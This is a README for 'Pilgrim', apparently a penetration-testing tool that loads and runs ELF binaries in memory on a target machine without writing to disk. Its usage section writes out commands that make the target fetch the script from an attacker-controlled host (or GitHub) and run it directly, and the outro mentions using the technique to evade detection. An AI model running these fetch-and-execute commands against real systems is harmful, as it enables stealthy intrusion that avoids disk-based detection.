# Pilgrim - Exec in Memory
Pilgrim is a staged python tool used to execute ELF binaries in memory without ever affecting the hard drive!
## Usage
It is best to host the pilgrim.py file in a directory alongside any ELF binaries and exploits that you plan to use during your engagement.

On your host machine, run the following:
```bash
python -m http-server
```
On the target machine, note the address of your system and run the following:
```bash
python3 <(curl http://<attacker-ip>:<port>/pilgrim.py)
```
or, using the official github version:
```bash
python3 <(curl https://raw.githubusercontent.com/diante0x7/Pilgrim/main/pilgrim.py)
```
It is wise to keep the http server open as long as necessary until you have completed execution of all of your payloads.
## Presentation
Within the repository, there is a Pilgrim.pdf file explaining the process and techniques used in development of this tool! Use that if there are any issues understanding execution or for demos of my Proof of Concept!
## Outro
This is a simple project that recalls me back to a time where such a tool was not widely available and it was necessary for me to evade detection by using this method. The techniques used in Pilgrim can be expanded upon and adapted to fit any and every need in the penetration testing space with endless possibilities! Hopefully you learned something new from this, and if not I hope you approve of my style of presentation.
